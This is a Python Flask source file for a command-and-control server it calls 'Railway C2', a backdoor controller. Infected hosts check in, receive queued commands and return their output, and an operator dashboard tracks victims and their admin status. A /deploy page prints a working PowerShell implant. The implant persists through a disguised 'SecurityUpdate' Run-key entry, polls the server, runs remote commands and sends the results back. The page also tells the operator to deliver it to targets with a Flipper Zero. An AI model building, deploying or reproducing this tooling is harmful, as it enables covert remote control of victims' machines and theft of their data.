import os
import sqlite3
import json
import datetime
from threading import Lock
from flask import Flask, request, jsonify, render_template

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'railway-c2-secret-2024')

# Thread-safe database
db_lock = Lock()
DATABASE_FILE = 'railway_c2.db'

# API Key für Sicherheit
API_KEY = os.environ.get('API_KEY', 'hitrun2024')

def init_database():
    """Initialize SQLite database optimized for Railway"""
    with sqlite3.connect(DATABASE_FILE) as conn:
        # Sessions table
        conn.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                hostname TEXT UNIQUE NOT NULL,
                username TEXT NOT NULL,
                ip_address TEXT,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                os_info TEXT,
                admin_status BOOLEAN DEFAULT FALSE,
                status TEXT DEFAULT 'active'
            )
        ''')
        
        # Commands table
        conn.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_hostname TEXT NOT NULL,
                command TEXT NOT NULL,
                executed BOOLEAN DEFAULT FALSE,
                result TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                executed_at TIMESTAMP,
                FOREIGN KEY (session_hostname) REFERENCES sessions (hostname)
            )
        ''')
        
        # Results table for better performance
        conn.execute('''
            CREATE TABLE IF NOT EXISTS command_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_hostname TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                execution_time REAL,
                success BOOLEAN DEFAULT TRUE,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Create indexes for better performance
        conn.execute('CREATE INDEX IF NOT EXISTS idx_sessions_hostname ON sessions(hostname)')
        conn.execute('CREATE INDEX IF NOT EXISTS idx_commands_session ON commands(session_hostname)')
        conn.execute('CREATE INDEX IF NOT EXISTS idx_commands_executed ON commands(executed)')

# =============================================================================
# CORE BACKDOOR API - Ultra optimized for Railway
# =============================================================================

@app.route('/b', methods=['POST'])
def beacon():
    """Main beacon endpoint - targets check in here"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Invalid request'}), 400
        
        hostname = data.get('h', 'unknown')
        username = data.get('u', 'unknown')
        admin_status = data.get('a', False)
        os_info = data.get('os', 'Unknown')
        
        # Get real IP (Railway handles X-Forwarded-For)
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ',' in ip_address:
            ip_address = ip_address.split(',')[0].strip()
        
        current_time = datetime.datetime.now()
        
        # Update or create session
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                conn.execute('''
                    INSERT OR REPLACE INTO sessions 
                    (hostname, username, ip_address, last_seen, os_info, admin_status, status)
                    VALUES (?, ?, ?, ?, ?, ?, 'active')
                ''', (hostname, username, ip_address, current_time, os_info, admin_status))
        
        # Get pending commands
        pending_commands = get_pending_commands(hostname)
        
        # Log beacon (optional - disable in production for stealth)
        print(f"[BEACON] {hostname} ({username}) from {ip_address} - Admin: {admin_status}")
        
        return jsonify({
            'c': pending_commands,
            'status': 'ok',
            'server_time': current_time.isoformat()
        })
        
    except Exception as e:
        print(f"Beacon error: {e}")
        return jsonify({'error': 'Server error'}), 500

@app.route('/r', methods=['POST'])
def result():
    """Command result endpoint"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Invalid request'}), 400
        
        hostname = data.get('h', 'unknown')
        command = data.get('c', '')
        output = data.get('o', '')
        execution_time = data.get('t', 0)
        success = data.get('s', True)
        
        current_time = datetime.datetime.now()
        
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                # Store detailed result
                conn.execute('''
                    INSERT INTO command_results 
                    (session_hostname, command, output, execution_time, success, timestamp)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (hostname, command, output[:5000], execution_time, success, current_time))  # Limit output size
                
                # Mark command as executed
                conn.execute('''
                    UPDATE commands 
                    SET executed = TRUE, result = ?, executed_at = ?
                    WHERE session_hostname = ? AND command = ? AND executed = FALSE
                ''', (output[:1000], current_time, hostname, command))
        
        print(f"[RESULT] {hostname}: {command[:30]}... ({len(output)} chars)")
        
        return jsonify({'status': 'received'})
        
    except Exception as e:
        print(f"Result error: {e}")
        return jsonify({'error': 'Server error'}), 500

@app.route('/test')
def health_check():
    """Health check endpoint for Railway"""
    return jsonify({
        'status': 'online',
        'server': 'Railway C2',
        'version': '3.0',
        'timestamp': datetime.datetime.now().isoformat()
    })

def get_pending_commands(hostname):
    """Get pending commands for a session"""
    with db_lock:
        with sqlite3.connect(DATABASE_FILE) as conn:
            cursor = conn.execute('''
                SELECT command FROM commands 
                WHERE session_hostname = ? AND executed = FALSE
                ORDER BY created_at ASC LIMIT 10
            ''', (hostname,))
            return [row[0] for row in cursor.fetchall()]

# =============================================================================
# WEB DASHBOARD
# =============================================================================

@app.route('/')
def dashboard():
    """Main dashboard page"""
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    return render_template('dashboard.html', timestamp=timestamp)

# =============================================================================
# API ENDPOINTS FOR DASHBOARD
# =============================================================================

@app.route('/api/sessions')
def api_sessions():
    """Get all sessions with detailed information"""
    try:
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                cursor = conn.execute('''
                    SELECT hostname, username, ip_address, os_info, admin_status, 
                           first_seen, last_seen, status
                    FROM sessions 
                    ORDER BY last_seen DESC
                ''')
                
                sessions = []
                for row in cursor.fetchall():
                    sessions.append({
                        'hostname': row[0],
                        'username': row[1],
                        'ip_address': row[2],
                        'os_info': row[3],
                        'admin_status': bool(row[4]),
                        'first_seen': row[5],
                        'last_seen': row[6],
                        'status': row[7]
                    })
        
        return jsonify({'sessions': sessions})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/stats')
def api_stats():
    """Get dashboard statistics"""
    try:
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                # Active sessions (last 5 minutes)
                active_cursor = conn.execute('''
                    SELECT COUNT(*) FROM sessions 
                    WHERE datetime(last_seen) > datetime('now', '-5 minutes')
                ''')
                active_sessions = active_cursor.fetchone()[0]
                
                # Total sessions
                total_cursor = conn.execute('SELECT COUNT(*) FROM sessions')
                total_sessions = total_cursor.fetchone()[0]
                
                # Admin sessions
                admin_cursor = conn.execute('''
                    SELECT COUNT(*) FROM sessions 
                    WHERE admin_status = 1 AND datetime(last_seen) > datetime('now', '-5 minutes')
                ''')
                admin_sessions = admin_cursor.fetchone()[0]
                
                # Total commands
                cmd_cursor = conn.execute('SELECT COUNT(*) FROM commands')
                total_commands = cmd_cursor.fetchone()[0]
        
        return jsonify({
            'active_sessions': active_sessions,
            'total_sessions': total_sessions,
            'admin_sessions': admin_sessions,
            'total_commands': total_commands
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/execute', methods=['POST'])
def api_execute():
    """Queue command for execution"""
    try:
        data = request.get_json()
        
        # Simple API key check
        if data.get('api_key') != API_KEY:
            return jsonify({'error': 'Unauthorized'}), 401
        
        session = data.get('session', '').strip()
        command = data.get('command', '').strip()
        
        if not session or not command:
            return jsonify({'error': 'Session and command required'}), 400
        
        # Add command to queue
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                conn.execute('''
                    INSERT INTO commands (session_hostname, command, executed)
                    VALUES (?, ?, FALSE)
                ''', (session, command))
        
        print(f"[COMMAND] Queued for {session}: {command}")
        
        return jsonify({'message': f'Command queued for execution on {session}'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/result/<session>/<path:command>')
def api_get_result(session, command):
    """Get result of executed command"""
    try:
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                cursor = conn.execute('''
                    SELECT output, execution_time, success, timestamp 
                    FROM command_results
                    WHERE session_hostname = ? AND command = ?
                    ORDER BY timestamp DESC LIMIT 1
                ''', (session, command))
                
                result = cursor.fetchone()
                if result:
                    return jsonify({
                        'result': result[0],
                        'execution_time': result[1],
                        'success': result[2],
                        'timestamp': result[3]
                    })
                else:
                    return jsonify({'result': None})
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# =============================================================================
# Session Management
# =============================================================================

@app.route('/api/toggle-status', methods=['POST'])
def toggle_status():
    """Toggle session status between active/inactive"""
    try:
        data = request.get_json()
        if data.get('api_key') != API_KEY:
            return jsonify({'error': 'Unauthorized'}), 401

        hostname = data.get('hostname', '').strip()
        if not hostname:
            return jsonify({'error': 'Hostname required'}), 400

        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                # Get current status
                cursor = conn.execute('SELECT status FROM sessions WHERE hostname = ?', (hostname,))
                row = cursor.fetchone()
                if not row:
                    return jsonify({'error': 'Session not found'}), 404

                current_status = row[0]
                new_status = 'inactive' if current_status == 'active' else 'active'

                # Update status
                conn.execute('UPDATE sessions SET status = ? WHERE hostname = ?', (new_status, hostname))

        return jsonify({'message': f'Status for {hostname} changed to {new_status}'}), 200

    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/delete-session', methods=['POST'])
def delete_session():
    """Delete a session and all associated data"""
    try:
        data = request.get_json()
        if data.get('api_key') != API_KEY:
            return jsonify({'error': 'Unauthorized'}), 401

        hostname = data.get('hostname', '').strip()
        if not hostname:
            return jsonify({'error': 'Hostname required'}), 400

        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                conn.execute('DELETE FROM sessions WHERE hostname = ?', (hostname,))
                conn.execute('DELETE FROM commands WHERE session_hostname = ?', (hostname,))
                conn.execute('DELETE FROM command_results WHERE session_hostname = ?', (hostname,))

        return jsonify({'message': f'Session {hostname} deleted successfully'}), 200

    except Exception as e:
        return jsonify({'error': str(e)}), 500

# =============================================================================
# DEPLOYMENT HELPER
# =============================================================================

@app.route('/deploy')
def deploy_instructions():
    """Show deployment instructions for Flipper Zero"""
    base_url = request.url_root.rstrip('/')
    
    instructions = f'''
<!DOCTYPE html>
<html>
<head>
    <title>🚀 Railway C2 Deployment Instructions</title>
    <style>
        body {{ font-family: monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }}
        .container {{ max-width: 1000px; margin: 0 auto; }}
        .code {{ background: #1a1a1a; border: 1px solid #00ff41; padding: 15px; margin: 10px 0; }}
        .highlight {{ color: #ffaa00; font-weight: bold; }}
        h1, h2 {{ color: #00ff41; text-shadow: 0 0 5px #00ff41; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 Railway C2 Server Deployment Complete!</h1>
        
        <h2>📡 Server Information</h2>
        <div class="code">
            <strong>Server URL:</strong> <span class="highlight">{base_url}</span><br>
            <strong>API Endpoint:</strong> {base_url}/b<br>
            <strong>Dashboard:</strong> <a href="{base_url}" style="color: #00ff41;">{base_url}</a><br>
            <strong>Status:</strong> <span style="color: #00ff41;">ONLINE</span>
        </div>
        
        <h2>🔧 Flipper Zero Configuration</h2>
        <p>Update your Flipper Zero code with this server URL:</p>
        <div class="code">
            <strong>File:</strong> hit_run_backdoor_i.h<br><br>
            <span style="color: #888;">// Change this line:</span><br>
            #define INTERNET_C2_SERVER "<span class="highlight">{base_url}</span>"
        </div>
        
        <h2>💉 Manual PowerShell Payload</h2>
        <p>For manual deployment or testing:</p>
        <div class="code" style="font-size: 12px; word-break: break-all;">
$s='{base_url}';$h=$env:COMPUTERNAME;$u=$env:USERNAME;$p="$env:APPDATA\\SecurityUpdate.ps1";$c='while(1){{try{{$d=@{{h=$h;u=$u;a=([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator");os=(Get-WmiObject -Class Win32_OperatingSystem).Caption}};$r=irm $s/b -m post -b($d|ConvertTo-Json) -ContentType "application/json";$r.c|%{{if($_){{$o=iex $_ 2>&1|out-string;irm $s/r -m post -b(@{{h=$h;c=$_;o=$o;t=0;s=$true}}|ConvertTo-Json) -ContentType "application/json"}}}}}}catch{{sleep 30}}}}';$c|out-file $p;reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityUpdate /d "powershell -w hidden -f $p" /f;$c|iex
        </div>
        
        <h2>✅ Testing</h2>
        <div class="code">
            <strong>Health Check:</strong> <a href="{base_url}/test" style="color: #00ff41;">{base_url}/test</a><br>
            <strong>Dashboard:</strong> <a href="{base_url}" style="color: #00ff41;">{base_url}</a><br>
            <strong>Expected Response:</strong> {{"status": "online", "server": "Railway C2"}}
        </div>
        
        <h2>🔒 Security Notes</h2>
        <ul>
            <li>✅ HTTPS automatically enabled by Railway</li>
            <li>✅ API key protection: hitrun2024</li>
            <li>✅ Real IP detection via X-Forwarded-For</li>
            <li>✅ SQLite database with session persistence</li>
            <li>⚠️ Change API_KEY environment variable for production</li>
        </ul>
        
        <h2>🚀 Next Steps</h2>
        <ol>
            <li>Update Flipper Zero code with the server URL above</li>
            <li>Compile and install updated Flipper app</li>
            <li>Deploy Hit & Run payload on target</li>
            <li>Monitor targets via web dashboard</li>
            <li>Execute commands remotely from anywhere</li>
        </ol>
        
        <p style="text-align: center; margin-top: 40px;">
            <a href="{base_url}" style="color: #00ff41; text-decoration: none; font-size: 18px;">
                🎯 Open C2 Dashboard →
            </a>
        </p>
    </div>
</body>
</html>
    '''
    
    return instructions

# =============================================================================
# ADMIN ENDPOINTS
# =============================================================================

@app.route('/admin/cleanup', methods=['POST'])
def admin_cleanup():
    """Clean old data"""
    try:
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                # Remove old sessions (7 days)
                conn.execute('''
                    DELETE FROM sessions 
                    WHERE datetime(last_seen) < datetime('now', '-7 days')
                ''')
                
                # Remove old commands (24 hours)
                conn.execute('''
                    DELETE FROM commands 
                    WHERE executed = TRUE AND datetime(created_at) < datetime('now', '-1 day')
                ''')
                
                # Remove old results (3 days)
                conn.execute('''
                    DELETE FROM command_results 
                    WHERE datetime(timestamp) < datetime('now', '-3 days')
                ''')
        
        return jsonify({'message': 'Cleanup completed successfully'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/admin/stats')
def admin_stats():
    """Detailed admin statistics"""
    try:
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                stats = {}
                
                # Database size
                cursor = conn.execute("SELECT page_count * page_size as size FROM pragma_page_count(), pragma_page_size()")
                stats['db_size_bytes'] = cursor.fetchone()[0]
                
                # Table counts
                stats['sessions_count'] = conn.execute("SELECT COUNT(*) FROM sessions").fetchone()[0]
                stats['commands_count'] = conn.execute("SELECT COUNT(*) FROM commands").fetchone()[0]
                stats['results_count'] = conn.execute("SELECT COUNT(*) FROM command_results").fetchone()[0]
                
                # Recent activity
                stats['commands_last_hour'] = conn.execute('''
                    SELECT COUNT(*) FROM commands 
                    WHERE datetime(created_at) > datetime('now', '-1 hour')
                ''').fetchone()[0]
        
        return jsonify(stats)
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# =============================================================================
# ERROR HANDLERS
# =============================================================================

@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Endpoint not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({'error': 'Internal server error'}), 500

# =============================================================================
# MAIN APPLICATION STARTUP
# =============================================================================

if __name__ == '__main__':
    # Initialize database
    init_database()
    
    # Get port from environment (Railway sets this)
    port = int(os.environ.get('PORT', 5000))
    
    print("🚀 Railway C2 Server Starting...")
    print(f"🌍 Server will be available at: https://your-app.railway.app")
    print(f"📊 Dashboard: https://your-app.railway.app")
    print(f"📡 API Endpoint: https://your-app.railway.app/b")
    print("=" * 60)
    
    # Run with gunicorn in production, Flask dev server locally
    if os.environ.get('RAILWAY_ENVIRONMENT'):
        # Production mode on Railway
        app.run(host='0.0.0.0', port=port, debug=False)
    else:
        # Development mode
        app.run(host='0.0.0.0', port=port, debug=True)
